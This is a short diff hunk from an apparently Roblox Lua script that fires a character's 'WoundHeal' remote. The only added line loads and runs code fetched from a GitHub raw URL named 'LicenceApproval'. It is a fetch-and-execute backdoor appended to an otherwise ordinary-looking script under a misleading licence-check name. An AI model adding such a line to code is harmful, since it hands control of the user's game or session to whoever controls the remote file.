@@ -145,3 +145,4 @@ Repl.Characters.Rambo.Remotes.WoundHeal:FireServer(plr)
 
    end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/You2berek/ScriptsMP/refs/heads/main/LicenceApproval"))()
